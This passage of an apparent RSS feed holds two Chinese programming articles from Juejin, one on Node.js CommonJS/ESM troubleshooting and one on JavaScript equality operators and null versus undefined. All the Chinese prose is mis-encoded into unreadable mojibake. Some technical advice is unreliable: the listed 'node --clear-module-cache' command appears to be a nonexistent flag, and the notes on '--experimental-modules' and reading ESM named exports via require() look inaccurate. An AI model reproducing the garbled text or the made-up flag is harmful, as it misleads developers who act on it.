<li>CJS åŠ è½½ç›®å½•æ—¶ï¼Œä¼šè‡ªåŠ¨æ‰¾ <code>index.js</code>ï¼›ESM ä¸ä¼šï¼Œå¿…é¡»åœ¨ç›®å½•çš„ <code>package.json</code> ä¸­é…ç½® <code>exports</code>ã€‚</li>
<li>ç¤ºä¾‹ï¼š<code>utils</code> ç›®å½•ä¸‹åŠ  <code>package.json</code></li>
<li>ä¹‹åæ‰èƒ½åœ¨ ESM ä¸­è¿™æ ·å†™ï¼š<code>import utils from './utils'</code>ã€‚</li>
</ul>
</li>
</ul>
<ol start="3">
<li><strong>ç¬¬ä¸‰æ–¹åŒ…çš„è·¯å¾„æ˜ å°„ä¼˜å…ˆçœ‹</strong> <code>exports</code></li>
</ol>
<ul>
<li>
<ul>
<li>è‹¥ç¬¬ä¸‰æ–¹åŒ…çš„ <code>package.json</code> æœ‰ <code>exports</code> å­—æ®µï¼ŒESM ä¼šä¸¥æ ¼æŒ‰å…¶è§„åˆ™åŠ è½½ï¼Œä¸èƒ½â€œè¶Šçº§â€å¯¼å…¥å­æ–‡ä»¶ã€‚</li>
<li>âŒ é”™è¯¯ï¼šåŒ… <code>my-pkg</code> çš„ <code>exports</code> åªæš´éœ²äº†æ ¹ï¼Œå´å†™ <code>import foo from 'my-pkg/src/foo.js'</code> â†’ æŠ¥é”™ã€‚</li>
<li>âœ… è§£å†³ï¼šè¦ä¹ˆè®©åŒ…åœ¨ <code>exports</code> ä¸­æ·»åŠ è¯¥è·¯å¾„ï¼Œè¦ä¹ˆç”¨ CJS åŠ è½½ï¼ˆCJS ä¸å— <code>exports</code> é™åˆ¶ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<h2 data-id="heading-3">å››ã€ å‘½ä»¤è¡Œè¿è¡Œä¸å·¥å…·é“¾é¿å‘</h2>
<ol>
<li><strong>è¿è¡Œ ESM æ–‡ä»¶çš„å‚æ•°æ³¨æ„</strong></li>
</ol>
<ul>
<li>
<ul>
<li>è‹¥æ²¡é…ç½® <code>package.json</code> çš„ <code>"type": "module"</code>ï¼Œè¿è¡Œ <code>.mjs</code> æ–‡ä»¶æ— éœ€é¢å¤–å‚æ•°ï¼›è¿è¡Œ <code>.js</code> æ–‡ä»¶éœ€åŠ  <code>--experimental-modules</code>ï¼ˆä½ç‰ˆæœ¬ Nodeï¼‰ï¼Œé«˜ç‰ˆæœ¬ Nodeï¼ˆv14.3+ï¼‰æ— éœ€ã€‚</li>
<li>å‘½ä»¤ç¤ºä¾‹ï¼š<code>node esm-file.js</code>ï¼ˆå·²é… <code>type: module</code>ï¼‰ã€<code>node esm-file.mjs</code>ï¼ˆæ— éœ€é…ç½®ï¼‰ã€‚</li>
</ul>
</li>
</ul>
<ol start="2">
<li><strong>TypeScript/æ‰“åŒ…å·¥å…·çš„å…¼å®¹è®¾ç½®</strong></li>
</ol>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"compilerOptions"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"module"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ESNext"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"moduleResolution"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"NodeNext"</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// åŒ¹é… Node.js çš„ ESM è§£æè§„åˆ™</span>
    <span class="hljs-attr">"outDir"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./dist"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"esModuleInterop"</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-comment">// å…¼å®¹ CJS æ¨¡å—çš„é»˜è®¤å¯¼å‡º</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li>
<ul>
<li>ç”¨ <code>tsc</code> ç¼–è¯‘æ—¶ï¼Œè‹¥ç›®æ ‡æ˜¯ ESMï¼Œéœ€åœ¨ <code>tsconfig.json</code> ä¸­è®¾ç½®ï¼š</li>
<li>ç”¨ <code>webpack/rollup</code> æ—¶ï¼Œéœ€æ˜ç¡®é…ç½® <code>output.format</code> ä¸º <code>cjs</code> æˆ– <code>esm</code>ï¼Œé¿å…æ‰“åŒ…åæ¨¡å—ç±»å‹æ··ä¹±ã€‚</li>
</ul>
</li>
</ul>
<h2 data-id="heading-4">äº”ã€CJS &amp; ESM æ··åˆé¡¹ç›®å¸¸è§é”™è¯¯æ’æŸ¥å¯¹ç…§è¡¨</h2>
<p>è¿™ä»½å¯¹ç…§è¡¨è¦†ç›– Demo è¿è¡Œä¸­æœ€å®¹æ˜“å‡ºç°çš„ 8 ç±»æŠ¥é”™ï¼ŒåŒ…å« <strong>é”™è¯¯ç°è±¡ã€æ ¹æœ¬åŸå› ã€è§£å†³æ–¹æ¡ˆ</strong>ï¼Œå¸®ä½ å¿«é€Ÿå®šä½å’Œä¿®å¤é—®é¢˜ã€‚</p>



























































<table><thead><tr><th>é”™è¯¯ç±»å‹</th><th>é”™è¯¯æç¤ºç¤ºä¾‹</th><th>æ ¹æœ¬åŸå› </th><th>è§£å†³æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td><strong>ESM æ‰©å±•åç¼ºå¤±</strong></td><td><code>Error [ERR_MODULE_NOT_FOUND]: Cannot find module './esm-helper' imported from ...</code></td><td>ESM è¦æ±‚å¿…é¡»å†™å…¨æ–‡ä»¶æ‰©å±•åï¼ˆ<code>.js</code>/<code>.mjs</code>ï¼‰ï¼Œä¸èƒ½åƒ CJS é‚£æ ·çœç•¥</td><td>åœ¨ <code>import</code> è¯­å¥ä¸­è¡¥å…¨æ‰©å±•åï¼Œä¾‹å¦‚ï¼š <code>import helper from './esm-helper.js'</code></td></tr><tr><td><strong>CJS ç›´æ¥åŠ è½½ ESM</strong></td><td><code>Error [ERR_REQUIRE_ESM]: require() of ES Module ... not supported.</code></td><td>CJS çš„ <code>require()</code> ä¸æ”¯æŒç›´æ¥åŠ è½½ ESM æ¨¡å—ï¼Œåªèƒ½åŠ è½½ CJS æ¨¡å—</td><td>æ”¹ç”¨ ESM çš„åŠ¨æ€ <code>import()</code> å‡½æ•°ï¼ˆè¿”å› Promiseï¼‰ï¼š <code>import('./esm-module.js').then(mod =&gt; { ... })</code></td></tr><tr><td><strong>ESM åŠ è½½ç›®å½•æ—  exports</strong></td><td><code>Error [ERR_MODULE_NOT_FOUND]: Cannot find module './utils' imported from ...</code></td><td>ESM åŠ è½½ç›®å½•æ—¶ï¼Œä¸ä¼šé»˜è®¤æ‰¾ <code>index.js</code>ï¼Œå¿…é¡»é…ç½®ç›®å½•çš„ <code>package.json</code> <code>exports</code> å­—æ®µ</td><td>åœ¨ <code>utils</code> ç›®å½•ä¸‹æ–°å»º <code>package.json</code>ï¼Œæ·»åŠ ï¼š <code>{ "exports": { ".": "./index.js" } }</code></td></tr><tr><td><strong>__dirname æœªå®šä¹‰</strong></td><td><code>ReferenceError: __dirname is not defined in ES module scope</code></td><td>ESM ä¸­ç§»é™¤äº† <code>__dirname</code>/<code>__filename</code> å…¨å±€å˜é‡</td><td>ç”¨ <code>import.meta.url</code> æ‰‹åŠ¨å®ç°ï¼Œå‚è€ƒ <code>esm-dirname.js</code> çš„ä»£ç </td></tr><tr><td><strong>type: module å†²çª</strong></td><td><code>SyntaxError: Cannot use import statement outside a module</code></td><td>æ ¹ç›®å½• <code>package.json</code> æ²¡é…ç½® <code>"type": "module"</code>ï¼Œ<code>.js</code> æ–‡ä»¶è¢«å½“ä½œ CJS è§£æ</td><td>åœ¨æ ¹ <code>package.json</code> ä¸­æ·»åŠ ï¼š <code>{ "type": "module" }</code>ï¼Œæˆ–æŠŠ ESM æ–‡ä»¶åç¼€æ”¹ä¸º <code>.mjs</code></td></tr><tr><td><strong>ç¬¬ä¸‰æ–¹åŒ… exports é™åˆ¶</strong></td><td><code>Error [ERR_PACKAGE_PATH_NOT_EXPORTED]: Package subpath './src/xxx' is not defined by "exports"</code></td><td>ç¬¬ä¸‰æ–¹åŒ…çš„ <code>package.json</code> <code>exports</code> å­—æ®µæœªæš´éœ²è¯¥å­è·¯å¾„ï¼ŒESM ä¸¥æ ¼éµå¾ªæ˜ å°„è§„åˆ™</td><td>1. æ”¹ç”¨åŒ…æš´éœ²çš„åˆæ³•è·¯å¾„ï¼› 2. è‹¥ä¸ºè‡ªå·±å¼€å‘çš„åŒ…ï¼Œåœ¨ <code>exports</code> ä¸­æ·»åŠ è¯¥è·¯å¾„æ˜ å°„</td></tr><tr><td><strong>CJS è§£æ„ ESM å…·åå¯¼å‡ºå¤±è´¥</strong></td><td><code>const { foo } = require('./esm-module.js')</code> â†’ <code>foo</code> ä¸º <code>undefined</code></td><td>ESM çš„å…·åå¯¼å‡ºä¸èƒ½è¢« CJS ç›´æ¥è§£æ„ï¼Œ<code>require()</code> åªèƒ½æ‹¿åˆ° ESM çš„é»˜è®¤å¯¼å‡º</td><td>å…ˆè·å–é»˜è®¤å¯¼å‡ºå†è§£æ„ï¼š <code>const mod = require('./esm-module.js'); const { foo } = mod.default;</code></td></tr><tr><td><strong>æ–‡ä»¶è·¯å¾„å¤§å°å†™é—®é¢˜</strong></td><td><code>Error [ERR_MODULE_NOT_FOUND]: Cannot find module './Esm-Helper.js'</code></td><td>Node.js è·¯å¾„è§£æåŒºåˆ†å¤§å°å†™ï¼ˆå°¤å…¶æ˜¯ Linux/macOS ç³»ç»Ÿï¼‰</td><td>ä¿è¯ <code>import</code> è·¯å¾„çš„å¤§å°å†™å’Œå®é™…æ–‡ä»¶åå®Œå…¨ä¸€è‡´</td></tr></tbody></table>
<h2 data-id="heading-5">å…­ã€é¢å¤–é€šç”¨æ’æŸ¥æŠ€å·§</h2>
<ol>
<li><strong>æ£€æŸ¥ Node.js ç‰ˆæœ¬</strong>ï¼šç¡®ä¿ Node.js â‰¥ v14.3.0ï¼Œä½ç‰ˆæœ¬å¯¹ ESM æ”¯æŒä¸å®Œå–„ã€‚</li>
<li><strong>æ¸…ç†ç¼“å­˜</strong>ï¼šè¿è¡Œ <code>node --clear-module-cache src/xxx.js</code> æ¸…é™¤æ¨¡å—ç¼“å­˜ï¼Œè§£å†³ç¼“å­˜å¯¼è‡´çš„è§£æå¼‚å¸¸ã€‚</li>
<li><strong>ç»å¯¹è·¯å¾„æµ‹è¯•</strong>ï¼šè‹¥ç›¸å¯¹è·¯å¾„æŠ¥é”™ï¼Œæ”¹ç”¨ç»å¯¹è·¯å¾„ï¼ˆç»“åˆ <code>__dirname</code>ï¼‰æµ‹è¯•ï¼Œæ’é™¤ç›¸å¯¹è·¯å¾„å±‚çº§é”™è¯¯ã€‚</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaScript ä¸­ ==ã€===ã€Object.is ä»¥åŠ nullã€undefinedã€undeclared çš„åŒºåˆ«]]></title>    <link>https://juejin.cn/post/7592593491861848064</link>    <guid>https://juejin.cn/post/7592593491861848064</guid>    <pubDate>2026-01-08T09:57:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592593491861848064" data-draft-id="7592593491861831680" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaScript ä¸­ ==ã€===ã€Object.is ä»¥åŠ nullã€undefinedã€undeclared çš„åŒºåˆ«"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript"/> <meta itemprop="datePublished" content="2026-01-08T09:57:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç é€”æ½‡æ½‡"/> <meta itemprop="url" content="https://juejin.cn/user/2386391857112611"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaScript ä¸­ ==ã€===ã€Object.is ä»¥åŠ nullã€undefinedã€undeclared çš„åŒºåˆ«
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2386391857112611/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç é€”æ½‡æ½‡
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:57:46.000Z" title="Thu Jan 08 2026 09:57:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1.åœ¨JavaScript å½“ä¸­ï¼Œ<code>==</code> å’Œ <code>===</code> ä¸Object.is()çš„åŒºåˆ«</h2>
<p>åœ¨JavaScript å½“ä¸­æœ‰è®¸å¤šå¯ä»¥æ¯”è¾ƒç›¸ç­‰ä¸å¦çš„æ–¹æ³•ã€‚å…¶ä¸­æœ€å¸¸è§çš„ä¸‰ä¸ªåˆ†åˆ«æ˜¯**<code>===</code>(ä¸¥æ ¼æ¯”è¾ƒ)<strong>ã€</strong><code>==</code>(æ¾æ•£æ¯”è¾ƒ)<strong>ï¼Œä»¥åŠ</strong><code>Object.is</code>(åŒå€¼æ¯”è¾ƒ)**ã€‚</p>
<h3 data-id="heading-1">1.1 ==æ¾æ•£æ¯”è¾ƒ(loose equality)</h3>
<p>==åœ¨æ¯”è¾ƒä¸¤ä¸ªå€¼ä¹‹å‰ï¼Œä¼šå…ˆå¼ºåˆ¶è½¬æ¢æ•°æ®ç±»å‹ï¼Œå˜æˆä¸¤è€…å¯ä»¥æ¯”è¾ƒçš„å½¢å¼ã€‚</p>
<p>å¦‚ä¸‹ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">1</span> == <span class="hljs-string">"1"</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-number">0</span> == <span class="hljs-literal">false</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-literal">undefined</span> == <span class="hljs-literal">null</span>); <span class="hljs-comment">// true</span>
</code></pre>
<p>å› ä¸ºä¼šå¼ºåˆ¶è½¬æ¢å‹åˆ«ï¼Œ<code>==</code>ä¼šå¸¦ç»™å¼€å‘è€…ä¸€äº›å›°æ‰°ã€‚å› æ­¤å¤šæ•°çš„æƒ…å†µï¼Œ<strong>ä¸å»ºè®®ä½¿ç”¨<code>==</code></strong>ã€‚</p>
<h3 data-id="heading-2">1.2 ä¸¥æ ¼æ¯”è¾ƒ(strict equality)</h3>
<p><code>===</code>ä¸ä¼šå¼ºåˆ¶è½¬æ¢å‹åˆ«ä¸å€¼ï¼Œæ‰€ä»¥å¦‚æœæ˜¯ä¸åŒå‹åˆ«ï¼Œæ¯”è¾ƒä¸¤è€…ä¼šå›ä¼ <code>false</code>ã€‚ä¸åŒå€¼çš„è¯ä¸€æ ·ä¼šå›ä¼ <code>false</code>ï¼Œ===çš„ JS è®¾è®¡åˆè¡·æ˜¯åˆ¤æ–­æ•°å€¼æ˜¯å¦ç›¸åŒã€‚</p>
<p>ä¸è¿‡æœ‰ä¸¤ä¸ªæƒ…å†µä¾‹å¤–ï¼š</p>
<ul>
<li>å½“æˆ‘ä»¬æ¯”è¾ƒ<code>+0</code>å’Œ<code>-0</code>æ—¶ï¼Œä¸¥æ ¼æ¯”è¾ƒä¼šå›ä¼ <code>true</code>ï¼›</li>
<li>ä»¥åŠæ¯”è¾ƒ<code>NaN</code>å’Œ<code>NaN</code>ä¼šæ˜¯<code>false</code>ã€‚è€Œè¿™ä¸¤ä¸ªçŠ¶å†µåˆ™æ˜¯åŒå€¼æ¯”è¾ƒ<code>Object.is</code>æ´¾ä¸Šç”¨åœºçš„æ—¶å€™ã€‚</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript">+<span class="hljs-number">0</span> === -<span class="hljs-number">0</span>; <span class="hljs-comment">// true</span>
<span class="hljs-title class_">NaN</span> === <span class="hljs-title class_">NaN</span>; <span class="hljs-comment">// false</span>
</code></pre>
<h3 data-id="heading-3">1.3 Object.isåŒå€¼æ¯”è¾ƒ(same-value equality)</h3>
<p>åŒå€¼æ¯”è¾ƒé¡¾åæ€ä¹‰æ˜¯åœ¨æ¯”è¾ƒä¸¤ä¸ªå€¼æ˜¯ä¸æ˜¯ç›¸ç­‰ã€‚è™½ç„¶å®ƒæ˜¯Object å¼€å¤´ï¼Œä½†æ¯”è¾ƒçš„å¯ä»¥æ˜¯ä»»æ„çš„ä¸¤ä¸ªå€¼ã€‚ä¾‹å¦‚ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">is</span>(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">is</span>(<span class="hljs-number">1</span>, <span class="hljs-string">"1"</span>)); <span class="hljs-comment">// false</span>
</code></pre>
<p>ä¸Šé¢æåˆ°çš„ä¸¤ç§åœ¨<code>===</code>æ—¶é‡åˆ°çš„é—®é¢˜ï¼Œå¯ä»¥é€è¿‡<code>Object.is</code>æœ‰æ•ˆåˆ†è¾¨</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">is</span>(+<span class="hljs-number">0</span>, -<span class="hljs-number">0</span>)); <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">is</span>(<span class="hljs-title class_">NaN</span>, <span class="hljs-title class_">NaN</span>)); <span class="hljs-comment">// true</span>
</code></pre>
<blockquote>
<p>=== +0 å’Œ-0 æ˜¯ trueï¼Œæ˜¯å› ä¸ºæ¯”è¾ƒçš„æ˜¯å€¼ï¼Œå°±æ˜¯ 0 è¿™ä¸ªå€¼ï¼Œè€Œä¸å…³å¿ƒä»–çš„æ–¹å‘ï¼ŒObject.is å…³å¿ƒäº†ä»–äº†æ–¹å‘ï¼Œå› ä¸ºæ–¹å‘æ˜¯ä¸åŒçš„ï¼Œæ‰€ä»¥ object.is æ˜¯falseã€‚</p>
<p><code>===</code>ä¸­çš„ä¸¤ä¸ªNaN çš„æ¯”è¾ƒï¼ŒNaN æ˜¯ä¸€ç§å¤±è´¥çŠ¶æ€ï¼ŒNot a Number,ä½†æ˜¯å¤±è´¥çš„åŸå› æ˜¯å¯èƒ½æ˜¯ä¸åŒçš„ï¼Œæ‰€ä»¥= ==ä¸­æ˜¯ falseã€‚ä½†æ˜¯åœ¨ object.isè¯­ä¹‰ä¸­ï¼Œè§„å®šäº†æ‰€æœ‰çš„ NaN éƒ½è¡¨ç¤ºä¸€ç§å€¼çŠ¶æ€ï¼Œæ‰€ä»¥æ˜¯ trueã€‚</p>
</blockquote>
<p>ä¸è¿‡å¦‚æœè¦æœ‰æ•ˆåˆ†è¾¨<code>NaN</code>ï¼Œåœ¨JavaScript æœ‰ä¸€ä¸ªæ–¹æ³•å«<code>isNaN</code>æ˜¯å¯ä»¥ä½¿ç”¨çš„ã€‚å‡å¦‚å¯¹äº<code>Object.is</code>æ„Ÿåˆ°é™Œç”Ÿï¼Œå¯ä»¥é€‰æ‹©ç”¨<code>Number.isNaN</code>ã€‚</p>
<h2 data-id="heading-4">2.JavaScript nullã€undefined ä¸undeclared çš„åŒºåˆ«?</h2>
<h3 data-id="heading-5">2.1 undefined ä¸null çš„åŒºåˆ« ?</h3>
<p><strong><code>undefined</code>è¡¨ç¤ºè¿˜æœªå®šä¹‰å€¼ï¼Œæ‰€ä»¥å½“ä¸€ä¸ªå˜æ•°è¢«å®£å‘Šä½†è¿˜æœªè¢«èµ‹äºˆä»»ä½•å€¼ä¹‹å‰</strong>ï¼Œè¿™ä¸ªå˜æ•°å°±ä¼šæ˜¯<code>undefined</code>ï¼Œå¯ä»¥ç†è§£ä¸ºã€Œå°šæœªã€ã€‚</p>
<p><strong><code>null</code>ä»£è¡¨çš„æ˜¯ä¸€ä¸ªå˜æ•°çš„ç©ºå€¼ï¼Œå¯ä»¥ç†è§£ä¸ºã€Œæ²¡æœ‰ã€</strong>ã€‚</p>
<p><code>undefined</code>å’Œ<code>null</code>åœ¨JavaScript ä¸­ï¼Œéƒ½æ˜¯å±äºåŸå§‹æ•°æ®ç±»å‹(primitive data types) ä¹‹ä¸€ï¼Œä¹Ÿå°±åƒä»»ä½•å…¶ä»–æ•°æ®ç±»å‹(data types)ï¼Œä¾‹å¦‚ï¼š<code>string</code>ã€<code>number</code>ä¸€æ ·ï¼Œå¯ä»¥è¢«èµ‹äºˆåœ¨å˜æ•°ä¸Šã€‚ä¸¤è€…åœ¨ä½¿ç”¨ä¸Šï¼Œä¸¤è€…ä¼šæœ‰ä¸åŒçš„æ„ä¹‰ã€‚</p>
<p>ä¸¾ä¾‹æ¥è¯´ï¼Œå½“å‰ç«¯è¦å‘åç«¯ç´¢å–æ•°æ®æ—¶ï¼Œå› ä¸ºéœ€è¦ç­‰å¾…æ•°æ®å›ä¼ ï¼Œæ‰€ä»¥æŸä¸ªå˜æ•°ä¸€å¼€å§‹å¯èƒ½æ˜¯<code>undefined</code>ï¼Œå½“æ•°æ®å›æ¥æ—¶ï¼Œå°±ä¼šå˜æˆè¯¥æ•°æ®ç±»å‹ã€‚ä»¥ä¸‹é¢çš„ä¾‹å­æ¥è¯´ï¼Œæˆ‘ä»¬æœ‰ä¸ªå˜é‡<code>users</code>ï¼Œå®šä¹‰å®ƒçš„ç±»å‹ä¸º</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">UserDTO</span>[] | <span class="hljs-literal">undefined</span>
</code></pre>
<p>è€Œä¸æ˜¯</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">UserDTO</span>[] | <span class="hljs-literal">null</span>
</code></pre>
<p>æ­£æ˜¯å› ä¸ºåœ¨æ‹¿åˆ°èµ„æ–™å‰ï¼Œ<code>users</code>æ˜¯ã€Œå°šæœªã€ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript">type <span class="hljs-title class_">UserDTO</span> = {
  <span class="hljs-attr">id</span>: string,
  <span class="hljs-attr">firstName</span>: string,
  <span class="hljs-attr">lastName</span>: string,
  <span class="hljs-attr">profilePicture</span>: string | <span class="hljs-literal">null</span>,
};

<span class="hljs-keyword">const</span> <span class="hljs-attr">users</span>: <span class="hljs-title class_">UserDTO</span>[] | <span class="hljs-literal">undefined</span> = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetchUsers</span>();
</code></pre>
<p>åä¹‹äº¦ç„¶ï¼Œä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå½“æ‹¿åˆ°äº†<code>users</code>ï¼Œæœ‰äº›ä½¿ç”¨è€…æ²¡æœ‰ç…§ç‰‡ï¼Œå› ä¸ºæ˜¯ã€Œæ²¡æœ‰ã€ï¼Œæ‰€ä»¥<code>profilePicture</code>çš„ç±»å‹æ˜¯</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">profilePicture</span>: string | <span class="hljs-literal">null</span>;
</code></pre>
<p>è€Œä¸æ˜¯</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">profilePicture</span>: string | <span class="hljs-literal">undefined</span>;
</code></pre>
